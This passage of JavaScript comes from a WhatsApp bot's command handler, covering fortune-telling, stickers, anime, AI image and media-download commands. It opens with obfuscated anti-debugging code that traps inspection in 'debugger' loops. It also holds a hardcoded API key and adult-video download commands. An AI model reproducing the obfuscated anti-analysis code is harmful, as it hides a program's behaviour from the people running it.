function(A){}['constructo'+'r']('while\x20(tru'+P(0x1b9))[P(0x1c8)](P(0x1b5));else(''+z/z)['length']!==0x1||z%0x14===0x0?function(){return!![];}['constructo'+'r'](P(0x1bc)+P(0x1a8))[P(0x1c7)]('action'):function(){return![];}[P(0x1c9)+'r'](P(0x1bc)+'gger')[P(0x1c8)](P(0x1a2)+'t');v(++z);}try{if(w)return v;else v(0x0);}catch(z){}}
        }
    break
    case 'fact': {
    	const { data } = await axios.get(`https://nekos.life/api/v2/fact`)
        return replydare(`${themeemoji} *Fact:* ${data.fact}\n`)   
    }
    break
    
case 'aimage':
try {
  if (!isPrem) return replyprem(mess.premium)
if (global.keyopenai === '') return replydare("Apike Anda Limit");
if (!q) return replydare(`Generate image from AI.\n\nExample:\n${prefix + command} Guys Riding Horses`)
const { Configuration, OpenAIApi } = require('openai')
const configuration = new Configuration({
apiKey: global.keyopenai,
});
const openai = new OpenAIApi(configuration);
const response = await openai.createImage({
prompt: text,
n: 1,
size: "512x512",
});
//console.log(response.data.data[0].url)
Dare.sendImage(from, response.data.data[0].url, text, m);
} catch (err) {
console.log(err);
replydare("Sorry, there seems to be an error :"+ err);
}
break

case 'numbercheck': case 'wncheck': {
if (!Number(text)) return reply(`Example : ${prefix + command} 234xxxxxx`)
let anu = await primbon.nomer_hoki(Number(text))
if (anu.status == false) return reply(anu.message)
reply(`• *Mobile phone number :* ${anu.message.nomer_hp}\n• *a level number:* ${anu.message.angka_shuzi}\n• *Positive Energy:*\n- Riches : ${anu.message.energi_positif.kekayaan}\n- Health : ${anu.message.energi_positif.kesehatan}\n- Love : ${anu.message.energi_positif.cinta}\n- Kestabilan : ${anu.message.energi_positif.kestabilan}\n- Percentage: ${anu.message.energi_positif.persentase}\n• *Negative Energy:*\n- Perselisihan : ${anu.message.energi_negatif.perselisihan}\n- Lost : ${anu.message.energi_negatif.kehilangan}\n- Catastrophe: ${anu.message.energi_negatif.malapetaka}\n- Destruction: ${anu.message.energi_negatif.kehancuran}\n- Percentage: ${anu.message.energi_negatif.persentase}`)
}
break
case 'artimimpi': case 'tafsirmimpi': {
if (!text) return reply(`Contoh : ${prefix + command} belanja`)
let anu = await primbon.tafsir_mimpi(text)
if (anu.status == false) return reply(anu.message)
reply(`• *Dream :* ${anu.message.mimpi}\n• *Meaning :* ${anu.message.arti}\n• *Solution :* ${anu.message.solusi}`)
}
break
case 'ramalanjodoh': case 'ramaljodoh': {
if (!text) return reply(`Contoh : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`)
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return reply(anu.message)
reply(`• *Nama Anda :* ${anu.message.nama_anda.nama}\n• *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n• *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n• *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'ramalanjodohbali': case 'ramaljodohbali': {
if (!text) return reply(`Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`)
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_jodoh_bali(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return reply(anu.message)
reply(`• *Nama Anda :* ${anu.message.nama_anda.nama}\n• *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n• *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n• *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'suamiistri': {
if (!text) return reply(`Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`)
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.suami_istri(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return reply(anu.message)
reply(`• *Nama Suami :* ${anu.message.suami.nama}\n• *Lahir Suami :* ${anu.message.suami.tgl_lahir}\n• *Nama Istri :* ${anu.message.istri.nama}\n• *Lahir Istri :* ${anu.message.istri.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'ramalancinta': case 'ramalcinta': {
if (!text) return reply(`Example: ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`)
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_cinta(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return reply(anu.message)
reply(`• *Nama Anda :* ${anu.message.nama_anda.nama}\n• *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n• *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n• *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n• *Sisi Positif :* ${anu.message.sisi_positif}\n• *Sisi Negatif :* ${anu.message.sisi_negatif}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'artinama': {
if (!text) return reply(`Example: ${prefix + command} Add Ardianta`)
let anu = await primbon.arti_nama(text)
if (anu.status == false) return reply(anu.message)
reply(`• *Nama :* ${anu.message.nama}\n• *Meaning :* ${anu.message.arti}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'kecocokannama': case 'cocoknama': {
if (!text) return reply(`Example : ${prefix + command} Added, 7, 7, 2005`)
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Life Path :* ${anu.message.life_path}\n• *Destiny :* ${anu.message.destiny}\n• *Destiny Desire :* ${anu.message.destiny_desire}\n• *Personality :* ${anu.message.personality}\n• *Percentage:* ${anu.message.persentase_kecocokan}`)
}
break
case 'kecocokanpasangan': case 'cocokpasangan': case 'pasangan': {
if (!text) return reply(`Example : ${prefix + command} Dika|Novia`)
let [nama1, nama2] = text.split`|`
let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
if (anu.status == false) return reply(anu.message)
Dare.sendImage(m.chat,  anu.message.gambar, `• *Nama Anda :* ${anu.message.nama_anda}\n• *Nama Pasangan :* ${anu.message.nama_pasangan}\n• *Sisi Positif :* ${anu.message.sisi_positif}\n• *Sisi Negatif :* ${anu.message.sisi_negatif}`)
}
break
case 'jadianpernikahan': case 'jadiannikah': {
if (!text) return reply(`Example : ${prefix + command} 6, 12, 2020`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Tanggal Pernikahan :* ${anu.message.tanggal}\n• *karakteristik :* ${anu.message.karakteristik}`)
}
break
case 'sifatusaha': {
if (!ext)return reply(`Example : ${prefix+ command} 28, 12, 2021`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Lahir :* ${anu.message.hari_lahir}\n• *Usaha :* ${anu.message.usaha}`)
}
break
case 'rejeki': case 'rezeki': {
if (!text) return reply(`Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Lahir :* ${anu.message.hari_lahir}\n• *Rezeki :* ${anu.message.rejeki}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'pekerjaan': case 'kerja': {
if (!text) return reply(`Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Lahir :* ${anu.message.hari_lahir}\n• *Pekerjaan :* ${anu.message.pekerjaan}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'ramalannasib': case 'ramalnasib': case 'nasib': {
if (!text) return reply(`Example : 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.ramalan_nasib(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Analisa :* ${anu.message.analisa}\n• *Angka Akar :* ${anu.message.angka_akar}\n• *Sifat :* ${anu.message.sifat}\n• *Elemen :* ${anu.message.elemen}\n• *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`)
}
break
case 'potensipenyakit': case 'penyakit': {
if (!text) return reply(`Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Analisa :* ${anu.message.analisa}\n• *Sektor :* ${anu.message.sektor}\n• *Elemen :* ${anu.message.elemen}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'artitarot': case 'tarot': {
if (!text) return reply(`Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
Dare.sendImage(m.chat, anu.message.image, `• *Lahir :* ${anu.message.tgl_lahir}\n• *Simbol Tarot :* ${anu.message.simbol_tarot}\n• *Meaning :* ${anu.message.arti}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'fengshui': {
if (!text) return `Example : ${prefix + command} Dika, 1, 2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`
let [nama, gender, tahun] = text.split`,`
let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
if (anu.status == false) return reply(anu.message)
reply(`• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tahun_lahir}\n• *Gender :* ${anu.message.jenis_kelamin}\n• *Angka Kua :* ${anu.message.angka_kua}\n• *Kelompok :* ${anu.message.kelompok}\n• *Karakter :* ${anu.message.karakter}\n• *Sektor Baik :* ${anu.message.sektor_baik}\n• *Sektor Buruk :* ${anu.message.sektor_buruk}`)
}
break
case 'haribaik': {
if (!text) return reply(`Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.petung_hari_baik(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Lahir :* ${anu.message.tgl_lahir}\n• *Kala Tinantang :* ${anu.message.kala_tinantang}\n• *Info :* ${anu.message.info}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'harisangar': case 'taliwangke': {
if (!text) return reply(`Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Lahir :* ${anu.message.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Info :* ${anu.message.info}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'harinaas': case 'harisial': {
if (!text) return reply(`Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Hari Lahir :* ${anu.message.hari_lahir}\n• *Tanggal Lahir :* ${anu.message.tgl_lahir}\n• *Hari Naas :* ${anu.message.hari_naas}\n• *Info :* ${anu.message.catatan}\n• *Catatan :* ${anu.message.info}`)
}
break
case 'nagahari': case 'harinaga': {
if (!text) return reply(`Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Hari Lahir :* ${anu.message.hari_lahir}\n• *Tanggal Lahir :* ${anu.message.tgl_lahir}\n• *Arah Naga Hari :* ${anu.message.arah_naga_hari}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'arahrejeki': case 'arahrezeki': {
if (!text) return reply(`Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Hari Lahir :* ${anu.message.hari_lahir}\n• *tanggal Lahir :* ${anu.message.tgl_lahir}\n• *Arah Rezeki :* ${anu.message.arah_rejeki}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'peruntungan': {
if (!text) return reply(`Example : ${prefix + command} DIka, 7, 7, 2005, 2022\n\nNote : ${prefix + command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`)
let [nama, tgl, bln, thn, untuk] = text.split`,`
let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
if (anu.status == false) return reply(anu.message)
reply(`• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'weton': case 'wetonjawa': {
if (!text) return reply(`Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.weton_jawa(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Tanggal :* ${anu.message.tanggal}\n• *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n• *Watak Hari :* ${anu.message.watak_hari}\n• *Naga Hari :* ${anu.message.naga_hari}\n• *Jam Baik :* ${anu.message.jam_baik}\n• *Watak Kelahiran :* ${anu.message.watak_kelahiran}`)
}
break
case 'sifat': case 'karakter': {
if (!text) return reply(`Example : ${prefix + command} Dika, 7, 7, 2005`)
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Garis Hidup :* ${anu.message.garis_hidup}`)
}
break
case 'keberuntungan': {
if (!text) return reply(`Example : ${prefix + command} Dika, 7, 7, 2005`)
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Hasil :* ${anu.message.result}`)
}
break
case 'memancing': {
if (!text) return reply(`Example : ${prefix + command} 12, 1, 2022`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Tanggal :* ${anu.message.tgl_memancing}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'masasubur': {
if (!text) return reply(`Example : ${prefix + command} 12, 1, 2022, 28\n\nNote : ${prefix + command} hari pertama menstruasi, siklus`)
let [tgl, bln, thn, siklus] = text.split`,`
let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
if (anu.status == false) return reply(anu.message)
reply(`• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'zodiak': case 'zodiac': {
if (!text) return reply(`Example : ${prefix+ command} 7 7 2005`)
let zodiak = [
["capricorn", new Date(1970, 0, 1)],
["aquarius", new Date(1970, 0, 20)],
["pisces", new Date(1970, 1, 19)],
["aries", new Date(1970, 2, 21)],
["taurus", new Date(1970, 3, 21)],
["gemini", new Date(1970, 4, 21)],
["cancer", new Date(1970, 5, 22)],
["leo", new Date(1970, 6, 23)],
["virgo", new Date(1970, 7, 23)],
["libra", new Date(1970, 8, 23)],
["scorpio", new Date(1970, 9, 23)],
["sagittarius", new Date(1970, 10, 22)],
["capricorn", new Date(1970, 11, 22)]
].reverse()

function getZodiac(month, day) {
let d = new Date(1970, month - 1, day)
return zodiak.find(([_,_d]) => d >= _d)[0]
}
let date = new Date(text)
if (date == 'Invalid Date') return date
let d = new Date()
let [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
let birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]

let zodiac = await getZodiac(birth[1], birth[2])

let anu = await primbon.zodiak(zodiac)
if (anu.status == false) return reply(anu.message)
reply(`• *Zodiak :* ${anu.message.zodiak}\n• *Nomor :* ${anu.message.nomor_keberuntungan}\n• *Aroma :* ${anu.message.aroma_keberuntungan}\n• *Planet :* ${anu.message.planet_yang_mengitari}\n• *Bunga :* ${anu.message.bunga_keberuntungan}\n• *Warna :* ${anu.message.warna_keberuntungan}\n• *Batu :* ${anu.message.batu_keberuntungan}\n• *Elemen :* ${anu.message.elemen_keberuntungan}\n• *Pasangan Zodiak :* ${anu.message.pasangan_zodiak}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'shio': {
if (!text) return reply(`Example : ${prefix + command} tikus\n\nNote : For Detail https://primbon.com/shio.htm`)
let anu = await primbon.shio(text)
if (anu.status == false) return reply(anu.message)
reply(`• *Hasil :* ${anu.message}`)
}
break

case 'myip': {
        if (!DareTheCreator) return reply(mess.only.owner)
var http = require('http')
http.get({
'host': 'api.ipify.org',
'port': 80,
'path': '/'
}, function(resp) {
resp.on('data', function(ip) {
    replydare("🔎 Ip Andreas Anda Adalah: " + ip)
})
})
            }
        break
        case 'mathquiz': case 'math': {
if (kuismath.hasOwnProperty(m.sender.split('@')[0])) return replydare("Masih Ada Sesion Yang Belum Di Selesaikan.")
let { genMath, modes } = require('./lib/math')
if (!text) return replydare(`Mode: ${Object.keys(modes).join(' | ')}\npilih example: ${prefix}math medium`)
let result = await genMath(text.toLowerCase())
Dare.sendText(m.chat, `*What is the result of: ${result.soal.toLowerCase()}*?\n\nTime: ${(result.waktu / 1000).toFixed(2)} second`, m).then(() => {
kuismath[m.sender.split('@')[0]] = result.jawaban
})
await sleep(result.waktu)
if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Answer: " + result.jawaban)
replydare("Time has run out\nAnswer: " + kuismath[m.sender.split('@')[0]])
delete kuismath[m.sender.split('@')[0]]
}
            }
            break

case 'readmore': {
	let [l, r] = text.split`|`
    if (!l) l = ''
    if (!r) r = ''
    Dare.sendMessage(m.chat, {text: l + readmore + r}, {quoted: m})
}
break;

              case 'yomamajoke': {
  try {
      // Fetch a yo mama joke from the API
      let res = await fetch(`https://yomamaindra.onrender.com/jokes`);

      if (!res.ok) {
          throw new Error(`API request failed with status ${res.status}`);
      }

      let json = await res.json();

      // Extract the joke from the response
      let yoMamaJoke = `${json.joke}`;

      // Image URL to use
      const imageUrl = 'https://files.catbox.moe/128g9s.jpg';

     
      // Send the message with the image and caption
      await Dare.sendMessage(m.chat, {
          image: { url: imageUrl },
          caption: `*Yo Mama Joke 😂:*\n\n${yoMamaJoke}`,
          footer: 'DARE-V4'
      });
  } catch (error) {
      console.error('API Fetch Error:', error);
      await Dare.sendText(m.chat, "An error occurred while fetching the joke. Please try again.");
  }
}
break;
case 'gdrive': {
		if (!args[0]) return replydare(`Please enter your gdrive link`)
	reply(mess.wait)
	const fg = require('api-dylux')
	try {
	let res = await fg.GDriveDl(args[0])
	 await replydare(`
≡ *Google Drive Download*
▢ *Name:* ${res.fileName}
▢ *Size:* ${res.fileSize}
▢ *Type:* ${res.mimetype}`)
	Dare.sendMessage(m.chat, { document: { url: res.downloadUrl }, fileName: res.fileName, mimetype: res.mimetype }, { quoted: m })
   } catch {
	replydare('Error: Please check your gdrive link 🗿') 
  }
}
break
case 'invite': {
	if (!m.isGroup) return reply(mess.only.group)
	if (!isBotAdmins) return reply('_Bots Must Become Admins First_')
if (!text) return replydare(`Please Enter the Number You Want to Invite\n\nExample :\n*${prefix + command}* 234xxx\n\nIf you want the group link type .linkgc`)
if (text.includes('+')) return replydare(`Enter the number together without *+*`)
if (isNaN(text)) return replydare(`Enter only the numbers plus your country code without spaces`)
let group = m.chat
let link = 'https://chat.whatsapp.com/' + await Dare.groupInviteCode(group)
      await Dare.sendMessage(text+'@s.whatsapp.net', {text: `≡ *GROUP INVITATION*\n\nA user invites you to join this group \n\n${link}`, mentions: [m.sender]})
        replydare(` An invite link is sent to the user`) 
}
break
case 'xnxxdl': {
	if (!isPrem) return replyprem(mess.premium)
	if (!text) return replydare(`Enter Url`)
        if (!text.includes('xnxx.com')) return replydare(`Enter an xnxx link`)
        reply(mess.wait)
        const fg = require('api-dylux')
            let xn = await fg.xnxxdl(text)
Dare.sendMessage(m.chat, { caption: `≡  *XNXX DL*
        
▢ *📌 Title*: ${xn.result.title}
▢ *⌚Duration* ${xn.result.duration}
▢ *🎞️Quality:* ${xn.result.quality}`, video: {url: xn.result.files.high} }, { quoted: m })
}
break
case 'xnxxsearch': {
	if (!isPrem) return replyprem(mess.premium)
	if (!text) return replydare(`Enter Query`)
	reply(mess.wait)
	const fg = require('api-dylux')
	let res = await fg.xnxxSearch(text)
            let ff = res.result.map((v, i) => `${i + 1}┃ *Title* : ${v.title}\n*Link:* ${v.link}\n`).join('\n') 
              if (res.status) replydare(ff)
              }
              break
              case 'pin':
              case 'pinterest': {
    let input = "> _example: Black clover_ pin";
    if (!text) return reply(input);
     reply('*Loading....*');
    const createImage = async (url) => {
        const { imageMessage } = await baileys.generateWAMessageContent({
            image: {
                url
            }
        }, {
            upload: Dare.waUploadToServer
        });
        return imageMessage;
    };
    async function pinterest(query) {
        let res = await fetch(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${query}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${query}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
        let json = await res.json();
        let data = json.resource_response.data.results;
        if (!data.length) reply(`Query "${query}" not found :/`);
        return data[~~(Math.random() * data.length)].images.orig.url;
    }
    const imageUrls = [];
    for (let i = 0; i < 10; i++) {
        const imageUrl = await pinterest(text);
        imageUrls.push(imageUrl);
    }
    const cards = await Promise.all(imageUrls.map(async (url, index) => ({
        header: proto.Message.InteractiveMessage.Header.fromObject({
            title: `Image ${index + 1}`,
            hasMediaAttachment: true,
            imageMessage: await createImage(url)
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
            buttons: [] // Hapus semua tombol
        })
    })));
    const msg = baileys.generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                    body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: `${text}\n> Batas 10 photo`
                    }),
                    carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                        cards
                    })
                })
            }
        }
    }, {});

    await Dare.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
};
break
case 'ringtone': {
		if (!text) return replydare(`Example : ${prefix + command} black rover`)
        let { ringtone } = require('./lib/scraper')
		let anutone2 = await ringtone(text)
		let result = anutone2[Math.floor(Math.random() * anutone2.length)]
		Dare.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
	    }
	    break
	case 'genshin':
if (!text) return replydare(`Which genshin are you lookin for?`)
try {
const genshin = require("genshin-api")
a = text.toLowerCase();
const anime = await genshin.Characters(text)
let txt = ""
txt += `🎀 *Nama:* ${anime.name}\n`
txt += `🎖️ *Judul:* ${anime.title}\n`
txt += `💠 *Versi:* ${anime.vision}\n`
txt += `🏹 *Weapon:* ${anime.weapon}\n`
txt += `💮 *Gender:* ${anime.gender}\n`
txt += `🌏 *Nation:* ${anime.nation}\n`
txt += `🪷 *Affiliation:* ${anime.affiliation}\n`
txt += `🌟 *Rarity:* ${anime.rarity}\n`
txt += `❄️ *Constellation:* ${anime.constellation}\n`
txt += `📖 *Description:* ${anime.description}\n`
txt += `🌐 *Url:* https://genshin-impact.fandom.com/wiki/${a}\n`
urll = `https://api.genshin.dev/characters/${a}/portrait`
await Dare.sendMessage(m.chat,{image:{url:urll}, caption:txt},{quoted:m})
} catch (err) {
console.log(err)
return replydare('Error')
}
break
case 'patrick':
case 'patricksticker': {
var ano = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/patrick')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await Dare.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
}
break
case 'dogesticker':
case 'dogestick':
	case 'doge':{
var ano = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/doge')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await Dare.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
}
break
case 'lovesticker':
case 'lovestick' :{
var ano = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/love')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await Dare.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })

}
break
case 'gura':
case 'gurastick':{
var ano = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/gura')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await Dare.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })

}
break
	case 'anime': {
if (!text) return replydare(`What Anime Are You Looking For?`)
const malScraper = require('mal-scraper')
reply(mess.wait)
        const anime = await malScraper.getInfoFromName(text).catch(() => null)
        if (!anime) return replydare(`Could not find`)
let animetxt = `
🎀 *Title: ${anime.title}*
🎋 *Type: ${anime.type}*
🎐 *Premiered on: ${anime.premiered}*
💠 *Total Episodes: ${anime.episodes}*
📈 *Status: ${anime.status}*
💮 *Genres: ${anime.genres}
📍 *Studio: ${anime.studios}*
🌟 *Score: ${anime.score}*
💎 *Rating: ${anime.rating}*
🏅 *Rank: ${anime.ranked}*
💫 *Popularity: ${anime.popularity}*
♦️ *Trailer: ${anime.trailer}*
🌐 *URL: ${anime.url}*
❄ *Description:* ${anime.synopsis}*`
await Dare.sendMessage(m.chat,{image:{url:anime.picture}, caption:animetxt},{quoted:m})
}
break
case 'animevideo': 
case 'amv': {
    if (!text) return reply('Enter the number sɪʀ\nExample: .amv 1')
    reply(mess.wait)
async function animeVideo() {
    const url = 'https://shortstatusvideos.com/anime-video-status-download/'; // Ganti dengan URL yang sesuai
    const response = await fetch(url);
    const html = await response.text();
    const $ = cheerio.load(html);
    const videos = [];
    $('a.mks_button.mks_button_small.squared').each((index, element) => {
        const href = $(element).attr('href');
        const title = $(element).closest('p').prevAll('p').find('strong').text();
        videos.push({
            title,
            source: href
        });
    });

    const randomIndex = Math.floor(Math.random() * videos.length);
    const randomVideo = videos[randomIndex];

    return randomVideo;
}

async function animeVideo2() {
    const url = 'https://mobstatus.com/anime-whatsapp-status-video/'; // Ganti dengan URL yang sesuai
    const response = await fetch(url);
    const html = await response.text();
    const $ = cheerio.load(html);

    const videos = [];

    const title = $('strong').text();

    $('a.mb-button.mb-style-glass.mb-size-tiny.mb-corners-pill.mb-text-style-heavy').each((index, element) => {
        const href = $(element).attr('href');
        videos.push({
            title,
            source: href
        });
    });

    const randomIndex = Math.floor(Math.random() * videos.length);
    const randomVideo = videos[randomIndex];

    return randomVideo;
}
    if (text == '1') {
        try {
            let resl = await animeVideo()
            let cap = `Here's the video, sɪʀ`
            await Dare.sendFile(m.chat, resl.source, "", cap, m)
        } catch (e) {
            await reply(eror)
        }
    }
    if (text == '2') {
        try {
            let resl = await animeVideo2()
            let cap = `Here's the video, sɪʀ`
            await Dare.sendFile(m.chat, resl.source, "", cap, m)
        } catch (e) {
            await reply(eror)
        }
    }
}
break
case 'imdb':
if (!text) return replydare(`_Name a Series or movie`)
reply(mess.wait)
            let fids = await axios.get(`http://www.omdbapi.com/?apikey=742b2d09&t=${text}&plot=full`)
            let imdbt = ""
            console.log(fids.data)
            imdbt += "⚍⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚍\n" + " ``` IMDB SEARCH```\n" + "⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎\n"
            imdbt += "🎬Title      : " + fids.data.Title + "\n"
            imdbt += "📅Year       : " + fids.data.Year + "\n"
            imdbt += "⭐Rated      : " + fids.data.Rated + "\n"
            imdbt += "📆Released   : " + fids.data.Released + "\n"
            imdbt += "⏳Runtime    : " + fids.data.Runtime + "\n"
            imdbt += "🌀Genre      : " + fids.data.Genre + "\n"
            imdbt += "👨🏻‍💻Director   : " + fids.data.Director + "\n"
            imdbt += "✍Writer     : " + fids.data.Writer + "\n"
            imdbt += "👨Actors     : " + fids.data.Actors + "\n"
            imdbt += "📃Plot       : " + fids.data.Plot + "\n"
            imdbt += "🌐Language   : " + fids.data.Language + "\n"
            imdbt += "🌍Country    : " + fids.data.Country + "\n"
            imdbt += "🎖️Awards     : " + fids.data.Awards + "\n"
            imdbt += "📦BoxOffice  : " + fids.data.BoxOffice + "\n"
